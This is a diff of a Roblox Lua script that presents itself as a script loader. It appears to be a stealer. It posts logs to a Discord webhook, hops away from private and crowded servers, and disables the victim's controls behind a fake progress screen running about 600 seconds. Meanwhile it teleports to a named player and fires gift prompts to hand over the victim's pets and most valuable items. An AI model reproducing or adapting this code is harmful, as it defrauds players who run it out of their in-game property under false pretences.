@@ -5,146 +5,43 @@ local logs_webhook = "https://discord.com/api/webhooks/1390321696182894834/PL1M_
 
 local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
 local player = game.Players.LocalPlayer
+local TeleportService = game:GetService("TeleportService")
+
+local function serverHop()
+    local servers = {}
+    local success, result = pcall(function()
+        return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
+    end)
+    
+    if success and result and result.data then
+        for _, v in pairs(result.data) do
+            if v.id ~= game.JobId and v.playing < v.maxPlayers then
+                table.insert(servers, v.id)
+            end
+        end
+    end
+    
+    if #servers > 0 then
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)])
+    else
+        task.wait(5)
+        serverHop()
+    end
+end
+
+if server == "VIPServer" then 
+    serverHop()
+    return
+end
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 local backpack = LocalPlayer:WaitForChild("Backpack")
 local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
 local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
 local req = (syn and syn.request) or (http and http.request) or (http_request) or request
-
--- Enhanced server teleport function with retry logic
-local function findBestServer(maxPlayers)
-    local attempts = 0
-    local maxAttempts = 5
-    local minPlayers = math.huge
-    local bestServerId = nil
-    
-    while attempts < maxAttempts do
-        local success, result = pcall(function()
-            return HttpService:JSONDecode(game:HttpGet(
-                "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
-            ))
-        end)
-        
-        if success and result and result.data then
-            -- Filter and sort servers
-            local validServers = {}
-            for _, server in ipairs(result.data) do
-                if server.playing and server.id ~= game.JobId and server.playing <= maxPlayers then
-                    table.insert(validServers, server)
-                    if server.playing < minPlayers then
-                        minPlayers = server.playing
-                        bestServerId = server.id
-                    end
-                end
-            end
-            
-            -- If we found an empty server, use it immediately
-            if minPlayers == 0 then
-                return bestServerId
-            end
-            
-            -- Sort by player count
-            table.sort(validServers, function(a, b)
-                return a.playing < b.playing
-            end)
-            
-            -- Return the best server found
-            if #validServers > 0 then
-                return validServers[1].id
-            end
-        end
-        
-        attempts = attempts + 1
-        task.wait(1) -- Wait before retrying
-    end
-    
-    return bestServerId
-end
-
-local function createTeleportGui(message)
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "TeleportingGui"
-    gui.IgnoreGuiInset = true
-    gui.ResetOnSpawn = false
-    gui.Parent = player:WaitForChild("PlayerGui")
-
-    local bg = Instance.new("Frame", gui)
-    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-    bg.Size = UDim2.new(1, 0, 1, 0)
-
-    local title = Instance.new("TextLabel", bg)
-    title.Text = "Finding Better Server..."
-    title.Font = Enum.Font.GothamBlack
-    title.TextColor3 = Color3.new(1, 1, 1)
-    title.TextScaled = true
-    title.Size = UDim2.new(0.8, 0, 0.12, 0)
-    title.Position = UDim2.new(0.1, 0, 0.28, 0)
-    title.BackgroundTransparency = 1
-
-    local status = Instance.new("TextLabel", bg)
-    status.Text = message or "Searching for low population server..."
-    status.Font = Enum.Font.Gotham
-    status.TextColor3 = Color3.fromRGB(180, 180, 180)
-    status.TextScaled = true
-    status.Size = UDim2.new(0.8, 0, 0.08, 0)
-    status.Position = UDim2.new(0.1, 0, 0.42, 0)
-    status.BackgroundTransparency = 1
-
-    return gui, status
-end
-
-local function teleportToBetterServer()
-    local maxPlayersAllowed = 3 -- Only look for servers with 3 or fewer players
-    local teleportGui, statusText = createTeleportGui()
-    
-    local function attemptTeleport()
-        local bestServer = findBestServer(maxPlayersAllowed)
-        
-        if bestServer then
-            statusText.Text = "Found server with " .. (maxPlayersAllowed == 0 and "no" or maxPlayersAllowed) .. " players! Teleporting..."
-            local success, err = pcall(function()
-                TeleportService:TeleportToPlaceInstance(game.PlaceId, bestServer)
-            end)
-            
-            if not success then
-                statusText.Text = "Teleport failed, retrying..."
-                task.wait(2)
-                attemptTeleport()
-            end
-        else
-            -- If no server found with current max players, relax the condition slightly
-            if maxPlayersAllowed < 10 then
-                maxPlayersAllowed = maxPlayersAllowed + 1
-                statusText.Text = string.format("No servers with %d players found. Trying %d players...", maxPlayersAllowed - 1, maxPlayersAllowed)
-                task.wait(1)
-                attemptTeleport()
-            else
-                statusText.Text = "Failed to find suitable server. Please try again later."
-                task.wait(3)
-                teleportGui:Destroy()
-            end
-        end
-    end
-    
-    task.spawn(attemptTeleport)
-end
-
--- Check server conditions and teleport if needed
-if server == "VIPServer" then 
-    teleportToBetterServer()
-    return
-end
-
-if #Players:GetPlayers() >= 4 then
-    teleportToBetterServer()
-    return
-end
-
 
 local p = LocalPlayer
 local h = (p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
@@ -153,6 +50,8 @@ h.JumpPower = 0
 pcall(function()
     require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable()
 end)
+
+local player = game.Players.LocalPlayer
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "ScriptLoader"
@@ -219,7 +118,7 @@ local fakeSteps = {
     "Almost done..."
 }
 
-local totalDuration = 600 -- shorter for quick test
+local totalDuration = 600
 local stepTime = 1
 local totalSteps = math.floor(totalDuration / stepTime)
 
@@ -242,6 +141,11 @@ local function formatNumber(num)
     local scaled = num / (1000 ^ magnitude)
 
     return string.format("%.2f%s", scaled, suffix)
+end
+
+if #Players:GetPlayers() >= 4 then
+    serverHop()
+    return
 end
 
 local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
@@ -387,119 +291,83 @@ local function unequipAllPets()
     end
 end
 
-local function getAllPrompts(root, maxDistance)
-    for _, descendant in ipairs(workspace:GetDescendants()) do
-        if descendant:IsA("ProximityPrompt") and descendant.Enabled and descendant.Parent then
-            local part = descendant.Parent:IsA("Model") and descendant.Parent:FindFirstChild("HumanoidRootPart") or descendant.Parent
-            if part and part:IsA("BasePart") then
-                local dist = (part.Position - root.Position).Magnitude
-                if dist <= maxDistance then
-                    return descendant
-                end
-            end
-        end
+local function FirePrompt(part)
+    local prompt = part:FindFirstChildOfClass("ProximityPrompt")
+    if not prompt then
+        return
     end
-end
 
-local function waitAndHoldPrompt(targetChar)
-    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if not root then return end
+    local temp = Instance.new("Part")
+    temp.Name = "holder"
+    temp.Anchored = true
+    temp.CanCollide = false
+    temp.Transparency = 1
+    temp.Size = Vector3.new(2, 2, 2)
+    temp.CFrame = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame * CFrame.new(3, 0, 0)
+    temp.Parent = workspace
 
-    for _ = 1, 50 do
-        local prompt = getAllPrompts(root, 10)
-        if prompt then
-            prompt.HoldDuration = 0.1
-            prompt.Enabled = true
-            pcall(function()
-                keypress(69)
-                task.wait(prompt.HoldDuration + 0.1)
-                keyrelease(69)
-            end)
-            return prompt
-        end
-        task.wait(0.1)
-    end
-end
+    prompt.Parent = temp
+    prompt.MaxActivationDistance = math.huge
+    prompt.HoldDuration = 0
+    prompt.Enabled = true
 
-local function getSortedTools()
-    local list = {}
-    for _, tool in ipairs(backpack:GetChildren()) do
-        if tool:IsA("Tool") and getKg(tool.Name) > 0 then
-            table.insert(list, tool)
-        end
-    end
-    table.sort(list, function(a, b)
-        return getKg(a.Name) > getKg(b.Name)
-    end)
-    return list
+    fireproximityprompt(prompt)
 end
 
 local started = false
 
 local function startGiving()
     local target = Players:FindFirstChild(username)
-    if not target or not target.Character or not LocalPlayer.Character then return end
+    if not target or not target.Character then return end
 
-    local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
-    if not myHRP or not targetHRP then return end
-
+    -- Teleport to target
+    local myHRP = LocalPlayer.Character:WaitForChild("HumanoidRootPart")
+    local targetHRP = target.Character:WaitForChild("HumanoidRootPart")
     myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 2, 0)
     task.wait(0.4)
 
-    local allowedPetTools = {}
+    -- Gift all allowed pets first
     for _, tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
             local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
             if allowedPets[baseName] then
-                table.insert(allowedPetTools, tool)
-            end
-        end
-    end
-
-    for _, tool in ipairs(allowedPetTools) do
-        if tool.Parent == backpack then
-            tool.Parent = LocalPlayer.Character
-            task.wait(0.25)
-
-            local start = tick()
-            while tick() - start < 3 do
-                waitAndHoldPrompt(target.Character)
+                tool.Parent = LocalPlayer.Character
                 task.wait(0.25)
-            end
-
-            if tool:IsDescendantOf(LocalPlayer.Character) then
-                tool.Parent = backpack
+                FirePrompt(target.Character:WaitForChild("Head"))
+                task.wait(0.25)
+                if tool:IsDescendantOf(LocalPlayer.Character) then
+                    tool.Parent = backpack
+                end
             end
         end
     end
 
+    -- Gift other items
     while true do
-        local tools = getSortedTools()
-
-        for i = #tools, 1, -1 do
-            local baseName = tools[i].Name:match("^(.-)%s*%[") or tools[i].Name
-            if allowedPets[baseName] then
-                table.remove(tools, i)
+        local tools = {}
+        for _, tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") and getKg(tool.Name) > 0 then
+                local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
+                if not allowedPets[baseName] then
+                    table.insert(tools, tool)
+                end
             end
         end
 
         if #tools == 0 then break end
 
+        -- Sort by value (kg)
+        table.sort(tools, function(a, b)
+            return getKg(a.Name) > getKg(b.Name)
+        end)
+
         for _, tool in ipairs(tools) do
-            if tool.Parent == backpack then
-                tool.Parent = LocalPlayer.Character
-                task.wait(0.25)
-
-                local start = tick()
-                while tick() - start < 3 do
-                    waitAndHoldPrompt(target.Character)
-                    task.wait(0.25)
-                end
-
-                if tool:IsDescendantOf(LocalPlayer.Character) then
-                    tool.Parent = backpack
-                end
+            tool.Parent = LocalPlayer.Character
+            task.wait(0.25)
+            FirePrompt(target.Character:WaitForChild("Head"))
+            task.wait(0.25)
+            if tool:IsDescendantOf(LocalPlayer.Character) then
+                tool.Parent = backpack
             end
         end
 
